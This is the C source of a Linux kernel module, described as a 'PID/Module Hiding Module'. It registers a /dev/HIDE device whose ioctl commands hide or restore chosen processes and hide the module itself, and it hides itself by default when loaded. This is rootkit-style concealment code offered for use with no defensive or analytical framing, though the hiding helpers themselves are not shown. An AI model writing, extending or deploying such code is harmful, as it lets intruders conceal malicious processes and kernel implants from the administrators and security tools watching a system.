#include <linux/module.h>
#include <linux/sched.h>
#include <linux/kernel.h>
#include <linux/version.h>
#include <linux/tty.h>
#include <linux/miscdevice.h>
#include <linux/uaccess.h>
#include <linux/rculist.h>
#include "entry.h"
#include "comm.h"
#include "hide_pid.h"
#include "hide_mod.h"  // 引入模块隐藏接口

#define DEVICE_NAME "HIDE"

// 移除原有module_hide/module_show相关变量和函数

int dispatch_open(struct inode *node, struct file *file)
{
    return 0;
}

int dispatch_close(struct inode *node, struct file *file)
{
    return 0;
}

long dispatch_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
{
    switch (cmd)
    {
        case OP_HIDE_PID:
            hide_process((pid_t)arg);
            return 0;
        case OP_RED_PID:
            restore_process((pid_t)arg);
            return 0;
        case OP_HIDE_MOD:
            // 调用隐藏自身的新接口
            return hide_self_module();
        case OP_RED_MOD:
            // 调用恢复自身的新接口
            return restore_self_module();
        default:
            return -EINVAL;
    }
}

static const struct file_operations dispatch_functions = {
    .owner = THIS_MODULE,
    .open = dispatch_open,
    .release = dispatch_close,
    .unlocked_ioctl = dispatch_ioctl,
};

static struct miscdevice misc = {
    .minor = MISC_DYNAMIC_MINOR,
    .name = DEVICE_NAME,
    .fops = &dispatch_functions,
};

int __init module_entry(void)
{
    int ret = misc_register(&misc);
    if (ret) {
        printk(KERN_ERR "Failed to register misc device: %d\n", ret);
        return ret;
    }
    printk(KERN_INFO "Module loaded, device: /dev/%s\n", DEVICE_NAME);
    // 默认隐藏自身
    hide_self_module();
    return 0;
}

void __exit exit_module(void)
{
    hide_exit();         // 恢复隐藏的PID
    hide_mod_exit();     // 恢复所有隐藏的模块（包括自身）
    misc_deregister(&misc);
    printk(KERN_INFO "Module unloaded\n");
}

module_init(module_entry);
module_exit(exit_module);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("HYLAB");
MODULE_DESCRIPTION("PID/Module Hiding Module");